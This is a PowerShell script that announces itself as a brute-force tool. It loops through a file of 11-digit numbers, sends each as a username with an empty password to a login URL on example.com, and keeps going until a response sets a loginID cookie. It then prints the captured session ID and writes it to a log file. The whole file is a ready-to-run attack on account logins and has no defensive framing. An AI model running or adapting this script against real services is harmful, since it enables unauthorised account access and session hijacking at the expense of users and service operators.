# Configuration variables
$NUMBERS_FILE = "158to.txt"
$SLEEP_TIME = 0
$LOG_FILE = "success_results.txt"

# Check if the numbers file exists
if (!(Test-Path $NUMBERS_FILE)) {
    Write-Host "Error: File not found!" -ForegroundColor Red
    exit
}

# Read numbers from file (only lines with digits)
$numbers = Get-Content $NUMBERS_FILE | Where-Object { $_ -match '^\d+$' }

if ($numbers.Count -eq 0) {
    Write-Host "Error: File is empty!" -ForegroundColor Red
    exit
}

# Clear previous log file content
Clear-Content -Path $LOG_FILE -ErrorAction SilentlyContinue

Write-Host "Starting Brute Force..." -ForegroundColor Green
Write-Host "Total numbers to check: $($numbers.Count)" -ForegroundColor Yellow
Write-Host "Scanning to find a valid loginID" -ForegroundColor Cyan
Write-Host "-----------------------------------"

$counter = 0
$total_requests = 0
$success_found = $false

while (-not $success_found) {

    $current_number = $numbers[$counter]

    if ($current_number -notmatch '^\d{11}$') {
        Write-Host "Warning: $current_number is not 11 digits! Skipping..." -ForegroundColor Red
    }
    else {

        $FULL_URL = "http://example.com/login?username=$current_number@512K/2M|0|pm|all|*no**|non***&password="

        $total_requests++
        Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Request #$total_requests - Testing: $current_number" -ForegroundColor Green

        try {
            $response = Invoke-WebRequest -Uri $FULL_URL -Method Get -ErrorAction Stop

            # Display the first 5 lines of the response
            $response.RawContent.Split("`n")[0..4]

            # Check if Set-Cookie header contains loginID
            $cookieHeader = $response.Headers["Set-Cookie"]

            if ($cookieHeader -and $cookieHeader -match "loginID=") {

                Write-Host "========================================" -ForegroundColor Green
                Write-Host "loginID Found successfully!" -ForegroundColor Green
                Write-Host "========================================" -ForegroundColor Green

                $loginID = ($cookieHeader -match "loginID=([^;]+)") | Out-Null
                $loginID = $Matches[1]

                Write-Host "Successful Number: $current_number" -ForegroundColor Cyan
                Write-Host "loginID: $loginID" -ForegroundColor Yellow

                Add-Content $LOG_FILE "==================================="
                Add-Content $LOG_FILE "Time of Discovery: $(Get-Date)"
                Add-Content $LOG_FILE "Target Number: $current_number"
                Add-Content $LOG_FILE "URL: $FULL_URL"
                Add-Content $LOG_FILE "loginID: $loginID"
                Add-Content $LOG_FILE "==================================="
                Add-Content $LOG_FILE ""

                Write-Host "Results have been saved to $LOG_FILE" -ForegroundColor Green

                $success_found = $true
                break
            }

        } catch {
            Write-Host "Request error encountered" -ForegroundColor Red
        }
    }

    $counter++
    if ($counter -ge $numbers.Count) {
        $counter = 0
        Write-Host "Reached the end of the list, restarting from the beginning..." -ForegroundColor Yellow
    }

    if (-not $success_found) {
        Start-Sleep -Seconds $SLEEP_TIME
    }
}

Write-Host "Scan complete. Total requests made: $total_requests" -ForegroundColor Green
Write-Host "Detailed results are saved in: $LOG_FILE" -ForegroundColor Cyan
